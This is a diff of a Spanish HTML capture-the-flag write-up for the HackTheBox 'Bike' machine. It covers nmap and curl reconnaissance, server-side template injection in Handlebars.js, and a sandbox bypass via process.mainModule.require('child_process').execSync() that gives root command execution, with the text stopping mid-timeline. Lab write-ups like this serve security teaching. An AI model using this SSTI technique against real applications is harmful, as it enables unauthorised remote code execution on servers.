+/* ─── PAYLOAD HIGHLIGHT ─── */
+.payload-wrap {
+  background: #020408;
+  border: 1px solid rgba(248,113,113,0.2);
+  border-radius: 10px;
+  padding: 16px;
+  margin: 12px 0;
+  overflow-x: auto;
+}
+.payload-label {
+  font-size: 10px;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  color: var(--red);
+  margin-bottom: 8px;
+}
+.payload-code {
+  font-family: 'Cascadia Code', 'Fira Code', monospace;
+  font-size: 12px;
+  color: var(--red);
+  white-space: pre-wrap;
+  word-break: break-all;
+  line-height: 1.8;
+}
+
+/* ─── FOOTER ─── */
+footer {
+  background: var(--bg2);
+  border-top: 1px solid var(--border);
+  padding: 28px 48px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  flex-wrap: gap;
+  gap: 16px;
+  font-size: 13px;
+  color: var(--text-muted);
+}
+.footer-left  { display: flex; align-items: center; gap: 12px; }
+.footer-brand { color: var(--accent); font-weight: 700; }
+.footer-sep   { color: var(--border); }
+footer a { color: var(--text-muted); }
+footer a:hover { color: var(--accent); }
+
+/* ─── MISC ─── */
+p { margin-bottom: 12px; color: var(--text-dim); font-size: 14px; line-height: 1.75; }
+p:last-child { margin-bottom: 0; }
+ul, ol { padding-left: 20px; color: var(--text-dim); font-size: 14px; line-height: 1.8; }
+li { margin-bottom: 4px; }
+li::marker { color: var(--accent); }
+h2 { color: #fff; font-size: 20px; margin-bottom: 12px; }
+h3 { color: var(--text-dim); font-size: 16px; margin-bottom: 8px; }
+h4 { color: var(--text-dim); font-size: 14px; margin-bottom: 6px; }
+strong { color: var(--text); }
+code {
+  font-family: 'Cascadia Code', 'Fira Code', monospace;
+  font-size: 12px;
+  background: var(--bg3);
+  color: var(--cyan);
+  padding: 1px 6px;
+  border-radius: 4px;
+  border: 1px solid var(--border);
+}
+</style>
 </head>
 <body>
-<canvas id="matrix"></canvas>
 
-<div class="hero">
-  <div class="hero-breadcrumb"><a href="#">HTB Máquinas</a> / <a href="#">Linux</a> / Bike</div>
-  <div class="tags">
-    <span class="tag tag-htb">HTB</span>
-    <span class="tag tag-os">LINUX</span>
-    <span class="tag tag-veryeasy">VERY EASY</span>
-    <span class="tag tag-htb">STARTING POINT</span>
+<!-- ══════════════════════════════════ HERO ══════════════════════════════════ -->
+<section class="hero">
+  <div class="hero-tags">
+    <span class="tag tag-platform">HackTheBox</span>
+    <span class="tag tag-platform" style="background:rgba(74,222,128,0.1);color:var(--green);border-color:rgba(74,222,128,0.3)">Starting Point</span>
+    <span class="tag tag-easy">Very Easy</span>
+    <span class="tag tag-os">Linux</span>
+    <span class="tag tag-web">Node.js / Express</span>
+    <span class="tag tag-ssti">SSTI</span>
+    <span class="tag tag-pwned">&#10003; Pwned</span>
   </div>
-  <h1>Bike <span>Machine</span></h1>
-  <p class="hero-desc">Aplicación Node.js con Handlebars vulnerable a Server-Side Template Injection (SSTI). Inyección de plantillas del lado del servidor para ejecución de código remoto y obtención de la flag como root.</p>
-  <div class="meta-row">
-    <div class="meta-item"><span class="meta-label">Autor</span><span class="meta-value green">Yoandy Ramírez Delgado</span></div>
-    <div class="meta-item"><span class="meta-label">Tipo</span><span class="meta-value">HTB Starting Point</span></div>
-    <div class="meta-item"><span class="meta-label">Herramienta Clave</span><span class="meta-value">nmap / curl</span></div>
-    <div class="meta-item"><span class="meta-label">Objetivo</span><span class="meta-value">root</span></div>
+  <h1>HTB <span>Bike</span></h1>
+  <div class="hero-sub">
+    Server-Side Template Injection en Handlebars.js — De usuario web a root en ~5 minutos.
+    Una máquina cuyo propio nombre revela el vector de ataque.
+  </div>
+  <div class="hero-stats">
+    <div class="hero-stat">
+      <span class="label">IP Target</span>
+      <span class="value accent">10.129.7.167</span>
+    </div>
+    <div class="hero-stat">
+      <span class="label">Fecha</span>
+      <span class="value">2026-03-17</span>
+    </div>
+    <div class="hero-stat">
+      <span class="label">OS</span>
+      <span class="value">Ubuntu Linux</span>
+    </div>
+    <div class="hero-stat">
+      <span class="label">Runtime</span>
+      <span class="value">Node.js + Express</span>
+    </div>
+    <div class="hero-stat">
+      <span class="label">Tiempo total</span>
+      <span class="value accent">~5 minutos</span>
+    </div>
+    <div class="hero-stat">
+      <span class="label">Privilegio final</span>
+      <span class="value" style="color:var(--red)">root (uid=0)</span>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ QUICK STATS ═══════════════════════════════ -->
+<div class="quick-stats">
+  <div class="qs-card">
+    <div class="num num-blue">2</div>
+    <div class="lbl">Puertos abiertos</div>
+  </div>
+  <div class="qs-card">
+    <div class="num num-red">3</div>
+    <div class="lbl">Vulnerabilidades</div>
+  </div>
+  <div class="qs-card">
+    <div class="num num-yellow">1</div>
+    <div class="lbl">RCE alcanzado</div>
+  </div>
+  <div class="qs-card">
+    <div class="num num-green">&#10003;</div>
+    <div class="lbl">Root obtenido</div>
   </div>
 </div>
 
-<div class="main">
-  <div class="content">
+<!-- ═══════════════════════════════ GRID LAYOUT ══════════════════════════════ -->
+<div class="layout">
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Sección</h2></div>
-      <div class="section-header">
-<div class="section-number">1</div>
-<div>
-<div class="section-title">Descripcion de la Maquina</div>
-<div class="section-subtitle">Contexto y objetivo</div>
-</div>
-</div>
-<p>
-<strong>Bike</strong> es una maquina de dificultad Very Easy de la plataforma HackTheBox Starting Point.
+<!-- ──────────────────── MAIN COLUMN ──────────────────── -->
+<main class="main">
+
+  <!-- ── 1. DESCRIPCION ── -->
+  <section class="section" id="descripcion">
+    <div class="section-header">
+      <div class="section-number">1</div>
+      <div>
+        <div class="section-title">Descripcion de la Maquina</div>
+        <div class="section-subtitle">Contexto y objetivo</div>
+      </div>
+    </div>
+
+    <p>
+      <strong>Bike</strong> es una maquina de dificultad Very Easy de la plataforma HackTheBox Starting Point.
       Ejecuta un servidor web <strong>Node.js con Express</strong> que renderiza plantillas mediante
       <strong>Handlebars.js</strong> sin sanitizar el input del usuario, permitiendo
       <strong>Server-Side Template Injection (SSTI)</strong> que deriva en ejecucion remota de comandos
       como <strong>root</strong>.
     </p>
-<p>
+
+    <p>
       La maquina es notable porque su nombre no es arbitrario: "Bike" es una pista directa al vector
       de ataque. Las bicicletas tienen <em>handlebars</em> (manillar), y el template engine vulnerable
       es precisamente <strong>Handlebars.js</strong>. HTB nombra sus maquinas con referencias sutiles
       a la tecnica de explotacion.
     </p>
-<div class="callout callout-tip">
-<strong>Objetivo:</strong> Explotar SSTI en Handlebars.js para obtener ejecucion de comandos
+
+    <div class="callout callout-tip">
+      <strong>Objetivo:</strong> Explotar SSTI en Handlebars.js para obtener ejecucion de comandos
       como root y leer <code>/root/flag.txt</code>.
     </div>
-<div class="callout callout-info">
-<strong>Stack tecnologico:</strong> Ubuntu Linux • OpenSSH 8.2p1 •
-      Node.js • Express.js • Handlebars.js (template engine)
+
+    <div class="callout callout-info">
+      <strong>Stack tecnologico:</strong> Ubuntu Linux &bull; OpenSSH 8.2p1 &bull;
+      Node.js &bull; Express.js &bull; Handlebars.js (template engine)
     </div>
+  </section>
+
+  <!-- ── 2. RECONOCIMIENTO ── -->
+  <section class="section" id="reconocimiento">
+    <div class="section-header">
+      <div class="section-number">2</div>
+      <div>
+        <div class="section-title">Reconocimiento</div>
+        <div class="section-subtitle">Escaneo de puertos y enumeracion web</div>
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Sección</h2></div>
-      <div class="section-header">
-<div class="section-number">2</div>
-<div>
-<div class="section-title">Reconocimiento</div>
-<div class="section-subtitle">Escaneo de puertos y enumeracion web</div>
-</div>
-</div>
-<!-- STEP 1: NMAP -->
-<div class="step-container">
-<div class="step-box">
-<div class="step-box-header">
-<span class="step-num">PASO 1</span>
-<span class="step-title">Escaneo Nmap — Descubrimiento de puertos</span>
-</div>
-<div class="step-body">
-<p>
-<strong>¿Que es Nmap?</strong> Network Mapper. Herramienta de codigo abierto para descubrir
+    <!-- STEP 1: NMAP -->
+    <div class="step-container">
+      <div class="step-box">
+        <div class="step-box-header">
+          <span class="step-num">PASO 1</span>
+          <span class="step-title">Escaneo Nmap — Descubrimiento de puertos</span>
+        </div>
+        <div class="step-body">
+          <p>
+            <strong>¿Que es Nmap?</strong> Network Mapper. Herramienta de codigo abierto para descubrir
             hosts, puertos y servicios en una red. Es el primer paso estandar en cualquier evaluacion
             de seguridad.
           </p>
-<p>
-<strong>¿Por que lo usamos aqui?</strong> Necesitamos saber que servicios expone el objetivo
+          <p>
+            <strong>¿Por que lo usamos aqui?</strong> Necesitamos saber que servicios expone el objetivo
             antes de intentar cualquier explotacion. Sin reconocimiento, vamos ciegos.
           </p>
-</div>
-</div>
-<div class="code-block">
-<div class="code-label">
-<span class="dot dot-yellow"></span>
-<span class="dot dot-green"></span>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-label">
+          <span class="dot dot-yellow"></span>
+          <span class="dot dot-green"></span>
           Comando — nmap
         </div>
-<div class="code-body"><span class="cmd">nmap</span> <span class="param">-sC</span> <span class="param">-sV</span> <span class="param">-p-</span> <span class="ip">10.129.7.167</span>
+        <div class="code-body"><span class="cmd">nmap</span> <span class="param">-sC</span> <span class="param">-sV</span> <span class="param">-p-</span> <span class="ip">10.129.7.167</span>
+
 <span class="comment"># Flags explicadas:</span>
 <span class="comment"># -sC  → Ejecuta scripts NSE por defecto (deteccion de servicios, banners, etc.)</span>
 <span class="comment"># -sV  → Deteccion de VERSION de cada servicio (nombre, version, info extra)</span>
 <span class="comment"># -p-  → Escanea TODOS los 65535 puertos (no solo los top 1000)</span></div>
-</div>
-<div class="output-box"><span style="color:var(--text-muted)">OUTPUT REAL — nmap</span>
+      </div>
+
+      <div class="output-box"><span style="color:var(--text-muted)">OUTPUT REAL — nmap</span>
 
 Starting Nmap 7.94 ( https://nmap.org )
 Nmap scan report for <span class="ip">10.129.7.167</span>
@@ -211,49 +938,54 @@ PORT   STATE SERVICE VERSION
 <span class="success">80/tcp open  http    Node.js (Express middleware)</span>
 |_http-title: Bike
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
-<div class="interpret-box">
-<strong>Interpretacion del output</strong>
+
+      <div class="interpret-box">
+        <strong>Interpretacion del output</strong>
         Puerto 22: SSH OpenSSH 8.2p1 — version reciente, sin vulnerabilidades conocidas obvias. No es el vector.
         Puerto 80: HTTP con Node.js/Express. Titulo de pagina "Bike" — misma palabra que el nombre de la maquina.
         La presencia de Node.js con un template engine es una señal clasica de posible SSTI.
       </div>
-<div class="decision-box">
-<strong>Decision tomada</strong>
+
+      <div class="decision-box">
+        <strong>Decision tomada</strong>
         Dos puertos: SSH (no atacable directamente sin credenciales) y HTTP (superficie de ataque principal).
         Procedemos a enumerar el servidor web en puerto 80.
       </div>
-</div>
-<!-- STEP 2: CURL INICIAL -->
-<div class="step-container">
-<div class="step-box">
-<div class="step-box-header">
-<span class="step-num">PASO 2</span>
-<span class="step-title">Inspeccion web — Entender el formulario</span>
-</div>
-<div class="step-body">
-<p>
-<strong>¿Que es curl?</strong> Cliente HTTP de linea de comandos. Permite enviar peticiones
+    </div>
+
+    <!-- STEP 2: CURL INICIAL -->
+    <div class="step-container">
+      <div class="step-box">
+        <div class="step-box-header">
+          <span class="step-num">PASO 2</span>
+          <span class="step-title">Inspeccion web — Entender el formulario</span>
+        </div>
+        <div class="step-body">
+          <p>
+            <strong>¿Que es curl?</strong> Cliente HTTP de linea de comandos. Permite enviar peticiones
             HTTP/HTTPS y ver la respuesta raw sin necesidad de un navegador.
           </p>
-<p>
-<strong>¿Por que lo usamos aqui?</strong> Para ver el codigo HTML del formulario y entender
+          <p>
+            <strong>¿Por que lo usamos aqui?</strong> Para ver el codigo HTML del formulario y entender
             que parametros acepta antes de manipularlos.
           </p>
-</div>
-</div>
-<div class="code-block">
-<div class="code-label">
-<span class="dot dot-yellow"></span>
-<span class="dot dot-green"></span>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-label">
+          <span class="dot dot-yellow"></span>
+          <span class="dot dot-green"></span>
           Comando — curl inspeccion inicial
         </div>
-<div class="code-body"><span class="cmd">curl</span> <span class="param">-s</span> http://<span class="ip">10.129.7.167</span>/
+        <div class="code-body"><span class="cmd">curl</span> <span class="param">-s</span> http://<span class="ip">10.129.7.167</span>/
 
 <span class="comment"># Flags explicadas:</span>
 <span class="comment"># -s  → Silent mode: suprime barra de progreso y mensajes de error de curl</span>
 <span class="comment">#      (output limpio, solo el HTML)</span></div>
-</div>
-<div class="output-box"><span style="color:var(--text-muted)">OUTPUT (fragmento relevante)</span>
+      </div>
+
+      <div class="output-box"><span style="color:var(--text-muted)">OUTPUT (fragmento relevante)</span>
 
 &lt;html&gt;
   &lt;body&gt;
@@ -266,126 +998,137 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
     &lt;/form&gt;
   &lt;/body&gt;
 &lt;/html&gt;</div>
-<div class="interpret-box">
-<strong>Interpretacion del output</strong>
+
+      <div class="interpret-box">
+        <strong>Interpretacion del output</strong>
         Hay un formulario con un campo <code>email</code> que hace POST a "/". El servidor probablemente
         toma ese valor y lo renderiza en una plantilla (ej: "Hola, user@example.com!").
         Si el template engine no sanitiza el input, podemos inyectar sintaxis de plantilla.
       </div>
-<div class="decision-box">
-<strong>Decision tomada</strong>
+
+      <div class="decision-box">
+        <strong>Decision tomada</strong>
         El campo "email" es el vector de inyeccion. Siguiente paso: probar con payloads SSTI
         para detectar si el input se procesa como codigo de plantilla.
       </div>
-</div>
+    </div>
+  </section>
+
+  <!-- ── 3. VULNERABILIDADES ── -->
+  <section class="section" id="vulnerabilidades">
+    <div class="section-header">
+      <div class="section-number">3</div>
+      <div>
+        <div class="section-title">Vulnerabilidades Identificadas</div>
+        <div class="section-subtitle">Analisis de superficie de ataque</div>
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Sección</h2></div>
-      <div class="section-header">
-<div class="section-number">3</div>
-<div>
-<div class="section-title">Vulnerabilidades Identificadas</div>
-<div class="section-subtitle">Analisis de superficie de ataque</div>
-</div>
-</div>
-<div class="vuln-card">
-<div class="vuln-header">
-<div>
-<div class="vuln-name">Server-Side Template Injection (SSTI)</div>
-<div class="vuln-cwe">CWE-94 — Improper Control of Generation of Code</div>
-</div>
-<span class="badge badge-red">CRITICA</span>
-</div>
-<div class="vuln-desc">
+    <div class="vuln-card">
+      <div class="vuln-header">
+        <div>
+          <div class="vuln-name">Server-Side Template Injection (SSTI)</div>
+          <div class="vuln-cwe">CWE-94 — Improper Control of Generation of Code</div>
+        </div>
+        <span class="badge badge-red">CRITICA</span>
+      </div>
+      <div class="vuln-desc">
         El servidor usa Handlebars.js para renderizar templates y pasa el input del usuario
         <strong>directamente al compilador de plantillas sin sanitizacion</strong>. Esto permite
         a un atacante inyectar sintaxis de Handlebars y hacer que el servidor ejecute logica
         arbitraria, incluyendo ejecucion de comandos del sistema operativo via
         <code>process.mainModule.require('child_process').execSync()</code>.
       </div>
-</div>
-<div class="vuln-card" style="border-left-color: var(--orange);">
-<div class="vuln-header">
-<div>
-<div class="vuln-name">Aplicacion ejecutandose como root</div>
-<div class="vuln-cwe">CWE-250 — Execution with Unnecessary Privileges</div>
-</div>
-<span class="badge badge-orange">ALTA</span>
-</div>
-<div class="vuln-desc">
+    </div>
+
+    <div class="vuln-card" style="border-left-color: var(--orange);">
+      <div class="vuln-header">
+        <div>
+          <div class="vuln-name">Aplicacion ejecutandose como root</div>
+          <div class="vuln-cwe">CWE-250 — Execution with Unnecessary Privileges</div>
+        </div>
+        <span class="badge badge-orange">ALTA</span>
+      </div>
+      <div class="vuln-desc">
         El proceso Node.js corre con <strong>uid=0 (root)</strong>, como revela el stack trace
         (<code>/root/Backend/...</code>) y confirma el payload RCE (<code>uid=0(root)</code>).
         Esto significa que cualquier RCE en la aplicacion otorga <strong>acceso root inmediato</strong>
         al sistema. El principio de minimo privilegio no se aplica en absoluto.
       </div>
-</div>
-<div class="vuln-card" style="border-left-color: var(--yellow);">
-<div class="vuln-header">
-<div>
-<div class="vuln-name">Stack Trace verbose expuesto al usuario</div>
-<div class="vuln-cwe">CWE-209 — Generation of Error Message Containing Sensitive Information</div>
-</div>
-<span class="badge badge-yellow">MEDIA</span>
-</div>
-<div class="vuln-desc">
-        Al inyectar <code>{{7*7}}</code>, el servidor devuelve un stack trace completo de
+    </div>
+
+    <div class="vuln-card" style="border-left-color: var(--yellow);">
+      <div class="vuln-header">
+        <div>
+          <div class="vuln-name">Stack Trace verbose expuesto al usuario</div>
+          <div class="vuln-cwe">CWE-209 — Generation of Error Message Containing Sensitive Information</div>
+        </div>
+        <span class="badge badge-yellow">MEDIA</span>
+      </div>
+      <div class="vuln-desc">
+        Al inyectar <code>&#123;&#123;7*7&#125;&#125;</code>, el servidor devuelve un stack trace completo de
         Handlebars que incluye: el <strong>nombre del template engine</strong> (Handlebars),
         la <strong>ruta del sistema de archivos</strong> (<code>/root/Backend/node_modules/handlebars/</code>),
         y la <strong>ubicacion del proceso</strong> dentro del directorio de root. Esta informacion
         acelera enormemente el reconocimiento del atacante.
       </div>
-</div>
+    </div>
+  </section>
+
+  <!-- ── 4. COMO FUNCIONA SSTI ── -->
+  <section class="section" id="ssti-explicacion">
+    <div class="section-header">
+      <div class="section-number">4</div>
+      <div>
+        <div class="section-title">¿Como funciona SSTI?</div>
+        <div class="section-subtitle">Explicacion tecnica y analogia</div>
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Sección</h2></div>
-      <div class="section-header">
-<div class="section-number">4</div>
-<div>
-<div class="section-title">¿Como funciona SSTI?</div>
-<div class="section-subtitle">Explicacion tecnica y analogia</div>
-</div>
-</div>
-<p>
+    <p>
       Un <strong>template engine</strong> es un sistema que toma una plantilla con marcadores de posicion
       y datos, y produce texto final. Por ejemplo, la plantilla
-      <code>Hola, {{name}}!</code> con dato <code>name = "Alice"</code> produce
+      <code>Hola, &#123;&#123;name&#125;&#125;!</code> con dato <code>name = "Alice"</code> produce
       <code>Hola, Alice!</code>.
     </p>
-<div class="ssti-diagram">
-<div style="color:var(--text-muted);font-size:11px;margin-bottom:12px;text-transform:uppercase;letter-spacing:1px;">FLUJO NORMAL (sin vulnerabilidad)</div>
-<div class="ssti-row">
-<span class="ssti-box ssti-normal">Input usuario: "alice@mail.com"</span>
-<span class="ssti-arrow">→</span>
-<span class="ssti-box ssti-normal">Template: "Hola, {{email}}!"</span>
-<span class="ssti-arrow">→</span>
-<span class="ssti-box ssti-result">Output: "Hola, alice@mail.com!"</span>
-</div>
-<div style="color:var(--text-muted);font-size:11px;margin:16px 0 12px;text-transform:uppercase;letter-spacing:1px;">FLUJO VULNERABLE (SSTI — input se interpreta como codigo)</div>
-<div class="ssti-row">
-<span class="ssti-box ssti-danger">Input usuario: "{{7*7}}"</span>
-<span class="ssti-arrow">→</span>
-<span class="ssti-box ssti-danger">Template: "Hola, {{email}}!" → Hola, {{7*7}}!</span>
-<span class="ssti-arrow">→</span>
-<span class="ssti-box ssti-result">Motor evalua: 7*7 = 49 → "Hola, 49!"</span>
-</div>
-<div style="color:var(--text-muted);font-size:11px;margin:16px 0 12px;text-transform:uppercase;letter-spacing:1px;">EXPLOTACION RCE (input = codigo malicioso)</div>
-<div class="ssti-row">
-<span class="ssti-box ssti-danger">Input: payload Handlebars SSTI</span>
-<span class="ssti-arrow">→</span>
-<span class="ssti-box ssti-danger">Motor evalua como codigo Node.js</span>
-<span class="ssti-arrow">→</span>
-<span class="ssti-box ssti-success">execSync('id') → "uid=0(root)"</span>
-</div>
-</div>
-<div class="callout callout-info">
-<strong>La raiz del problema:</strong> El server toma el input del usuario y lo <em>concatena</em>
+
+    <div class="ssti-diagram">
+      <div style="color:var(--text-muted);font-size:11px;margin-bottom:12px;text-transform:uppercase;letter-spacing:1px;">FLUJO NORMAL (sin vulnerabilidad)</div>
+      <div class="ssti-row">
+        <span class="ssti-box ssti-normal">Input usuario: "alice@mail.com"</span>
+        <span class="ssti-arrow">→</span>
+        <span class="ssti-box ssti-normal">Template: "Hola, {{email}}!"</span>
+        <span class="ssti-arrow">→</span>
+        <span class="ssti-box ssti-result">Output: "Hola, alice@mail.com!"</span>
+      </div>
+
+      <div style="color:var(--text-muted);font-size:11px;margin:16px 0 12px;text-transform:uppercase;letter-spacing:1px;">FLUJO VULNERABLE (SSTI — input se interpreta como codigo)</div>
+      <div class="ssti-row">
+        <span class="ssti-box ssti-danger">Input usuario: "{{7*7}}"</span>
+        <span class="ssti-arrow">→</span>
+        <span class="ssti-box ssti-danger">Template: "Hola, {{email}}!" → Hola, {{7*7}}!</span>
+        <span class="ssti-arrow">→</span>
+        <span class="ssti-box ssti-result">Motor evalua: 7*7 = 49 → "Hola, 49!"</span>
+      </div>
+
+      <div style="color:var(--text-muted);font-size:11px;margin:16px 0 12px;text-transform:uppercase;letter-spacing:1px;">EXPLOTACION RCE (input = codigo malicioso)</div>
+      <div class="ssti-row">
+        <span class="ssti-box ssti-danger">Input: payload Handlebars SSTI</span>
+        <span class="ssti-arrow">→</span>
+        <span class="ssti-box ssti-danger">Motor evalua como codigo Node.js</span>
+        <span class="ssti-arrow">→</span>
+        <span class="ssti-box ssti-success">execSync('id') → "uid=0(root)"</span>
+      </div>
+    </div>
+
+    <div class="callout callout-info">
+      <strong>La raiz del problema:</strong> El server toma el input del usuario y lo <em>concatena</em>
       dentro del string de la plantilla antes de compilarla, en lugar de pasarlo como dato al contexto
       del template. Es equivalente a una SQL Injection pero para template engines.
     </div>
-<div class="analogy-box">
-<div class="analogy-text">
+
+    <div class="analogy-box">
+      <div class="analogy-text">
         Imagina un chef (el servidor) que escribe un menu del dia en una pizarra.
         Normalmente, el cliente le dice el nombre para personalizar el pedido,
         y el chef escribe "Mesa para Alice". Pero si el cliente dice "Mesa para <em>borrar todo y pedir pizza gratis</em>",
@@ -393,191 +1136,201 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
         en el sistema del restaurante. SSTI es exactamente eso: el usuario convierte su <em>dato</em>
         en <em>instruccion</em>, y el servidor la ejecuta sin darse cuenta.
       </div>
-<div class="analogy-caption">Analogia: Input-como-instruccion vs Input-como-dato</div>
-</div>
-<h3 style="margin-top:20px;">¿Por que Handlebars es mas dificil de explotar?</h3>
-<p>
+      <div class="analogy-caption">Analogia: Input-como-instruccion vs Input-como-dato</div>
+    </div>
+
+    <h3 style="margin-top:20px;">¿Por que Handlebars es mas dificil de explotar?</h3>
+    <p>
       Handlebars tiene un <strong>sandbox</strong> de seguridad que bloquea el acceso directo a
       <code>require()</code> y otros globales de Node.js. Esto hace que payloads simples fallen.
       Sin embargo, el sandbox tiene una escape: se puede acceder a
       <code>process.mainModule</code> a traves de la cadena de prototipos de objetos,
       y desde ahi llamar a <code>require('child_process')</code> para ejecutar comandos.
     </p>
-<div class="callout callout-warn">
-<strong>Por que falla el primer intento:</strong> <code>require</code> no esta disponible en el
+
+    <div class="callout callout-warn">
+      <strong>Por que falla el primer intento:</strong> <code>require</code> no esta disponible en el
       contexto del sandbox de Handlebars, pero <code>process.mainModule.require</code> accede al
       modulo raiz de Node.js, que si tiene acceso completo al sistema.
     </div>
+  </section>
+
+  <!-- ── 5. BHM INSIGHT ── -->
+  <section class="section" id="bhm-insight">
+    <div class="section-header">
+      <div class="section-number">5</div>
+      <div>
+        <div class="section-title">El Nombre como Pista — BHM Insight</div>
+        <div class="section-subtitle">Behavioral & Heuristic Mapping: decodificando la nomenclatura de HTB</div>
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Sección</h2></div>
-      <div class="section-header">
-<div class="section-number">5</div>
-<div>
-<div class="section-title">El Nombre como Pista — BHM Insight</div>
-<div class="section-subtitle">Behavioral &amp; Heuristic Mapping: decodificando la nomenclatura de HTB</div>
-</div>
-</div>
-<div class="bhm-box">
-<div class="bhm-header">
-<span class="bhm-badge">BHM Analysis</span>
-<span class="bhm-title">Bike → Handlebar → Handlebars.js</span>
-</div>
-<div class="bhm-body">
-<div class="bhm-arrow">
-<div class="bhm-node" style="color:var(--accent)">🚲 "Bike"</div>
-<span class="bhm-arrow-char">→</span>
-<div class="bhm-node" style="color:var(--cyan)">Las bicis tienen <em>handlebars</em> (manillares)</div>
-<span class="bhm-arrow-char">→</span>
-<div class="bhm-node" style="color:var(--yellow)">Handlebars.js</div>
-<span class="bhm-arrow-char">→</span>
-<div class="bhm-node" style="color:var(--red)">SSTI</div>
-</div>
-<p style="margin-top:14px;">
+    <div class="bhm-box">
+      <div class="bhm-header">
+        <span class="bhm-badge">BHM Analysis</span>
+        <span class="bhm-title">Bike → Handlebar → Handlebars.js</span>
+      </div>
+      <div class="bhm-body">
+        <div class="bhm-arrow">
+          <div class="bhm-node" style="color:var(--accent)">🚲 "Bike"</div>
+          <span class="bhm-arrow-char">→</span>
+          <div class="bhm-node" style="color:var(--cyan)">Las bicis tienen <em>handlebars</em> (manillares)</div>
+          <span class="bhm-arrow-char">→</span>
+          <div class="bhm-node" style="color:var(--yellow)">Handlebars.js</div>
+          <span class="bhm-arrow-char">→</span>
+          <div class="bhm-node" style="color:var(--red)">SSTI</div>
+        </div>
+        <p style="margin-top:14px;">
           HackTheBox tiene una practica sistematica de nombrar maquinas con referencias semanticas
           al vector de ataque principal. No es coincidencia: es un <strong>meta-hint</strong> para
           el pentester experimentado. Aprender a leer estos nombres acelera el reconocimiento inicial.
         </p>
-<p>
+        <p>
           En este caso, "Bike" en ingles evoca inmediatamente "handlebar" (manillar de bicicleta).
           Un pentester familiarizado con template engines reconoce al instante que
           <strong>Handlebars.js</strong> es el sospechoso principal, y orienta toda la investigacion
           hacia SSTI antes incluso de abrir el navegador.
         </p>
-</div>
-</div>
-<h3>Otros ejemplos del patron de nomenclatura HTB</h3>
-<div class="artifact-card">
-<div class="artifact-icon">🔧</div>
-<div>
-<div class="artifact-name">Bike → Handlebar → Handlebars.js SSTI</div>
-<div class="artifact-desc">El manillar de una bici = template engine vulnerable</div>
-</div>
-</div>
-<div class="artifact-card">
-<div class="artifact-icon">🐸</div>
-<div>
-<div class="artifact-name">Fawn → FTP anonimo (vsftpd)</div>
-<div class="artifact-desc">Un cervatillo (fawn) es inofensivo y accesible — como el FTP anonimo</div>
-</div>
-</div>
-<div class="artifact-card">
-<div class="artifact-icon">🐱</div>
-<div>
-<div class="artifact-name">Meow → Telnet root sin password</div>
-<div class="artifact-desc">Un gato entrando sigilosamente — acceso sin friccion</div>
-</div>
-</div>
-<div class="callout callout-tip">
-<strong>Heuristica BHM:</strong> Al recibir el nombre de una maquina HTB, busca la asociacion
+      </div>
+    </div>
+
+    <h3>Otros ejemplos del patron de nomenclatura HTB</h3>
+    <div class="artifact-card">
+      <div class="artifact-icon">🔧</div>
+      <div>
+        <div class="artifact-name">Bike → Handlebar → Handlebars.js SSTI</div>
+        <div class="artifact-desc">El manillar de una bici = template engine vulnerable</div>
+      </div>
+    </div>
+    <div class="artifact-card">
+      <div class="artifact-icon">🐸</div>
+      <div>
+        <div class="artifact-name">Fawn → FTP anonimo (vsftpd)</div>
+        <div class="artifact-desc">Un cervatillo (fawn) es inofensivo y accesible — como el FTP anonimo</div>
+      </div>
+    </div>
+    <div class="artifact-card">
+      <div class="artifact-icon">🐱</div>
+      <div>
+        <div class="artifact-name">Meow → Telnet root sin password</div>
+        <div class="artifact-desc">Un gato entrando sigilosamente — acceso sin friccion</div>
+      </div>
+    </div>
+
+    <div class="callout callout-tip">
+      <strong>Heuristica BHM:</strong> Al recibir el nombre de una maquina HTB, busca la asociacion
       semantica con protocolos, herramientas o vulnerabilidades. El nombre suele ser una pista de
       primer nivel que orienta el vector de reconocimiento inicial.
     </div>
+  </section>
+
+  <!-- ── 6. TIMELINE ── -->
+  <section class="section" id="timeline">
+    <div class="section-header">
+      <div class="section-number">6</div>
+      <div>
+        <div class="section-title">Timeline de Ataque</div>
+        <div class="section-subtitle">Secuencia cronologica — ~5 minutos total</div>
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Sección</h2></div>
-      <div class="section-header">
-<div class="section-number">6</div>
-<div>
-<div class="section-title">Timeline de Ataque</div>
-<div class="section-subtitle">Secuencia cronologica — ~5 minutos total</div>
-</div>
-</div>
-<div class="timeline">
-<div class="tl-item">
-<div class="tl-dot blue"></div>
-<div class="tl-time">T+00:00</div>
-<div class="tl-title">Escaneo Nmap</div>
-<div class="tl-desc">Descubrimiento de puertos 22 (SSH) y 80 (HTTP Node.js/Express). Titulo "Bike" confirma nombre de maquina.</div>
-</div>
-<div class="tl-item">
-<div class="tl-dot blue"></div>
-<div class="tl-time">T+00:45</div>
-<div class="tl-title">Reconocimiento web</div>
-<div class="tl-desc">curl al puerto 80 revela formulario POST con campo "email". Superficie de inyeccion identificada.</div>
-</div>
-<div class="tl-item">
-<div class="tl-dot yellow"></div>
-<div class="tl-time">T+01:00</div>
-<div class="tl-title">Probe SSTI inicial {{7*7}}</div>
-<div class="tl-desc">Stack trace de Handlebars confirma: template engine = Handlebars.js, proceso en /root/Backend/. SSTI confirmado.</div>
-</div>
-<div class="tl-item">
-<div class="tl-dot red"></div>
-<div class="tl-time">T+01:30</div>
-<div class="tl-title">Intento RCE directo (fallido)</div>
-<div class="tl-desc">require('child_process') bloqueado por sandbox de Handlebars. Error: "require is not defined".</div>
-</div>
-<div class="tl-item">
-<div class="tl-dot"></div>
-<div class="tl-time">T+02:30</div>
-<div class="tl-title">Bypass de sandbox via process.mainModule</div>
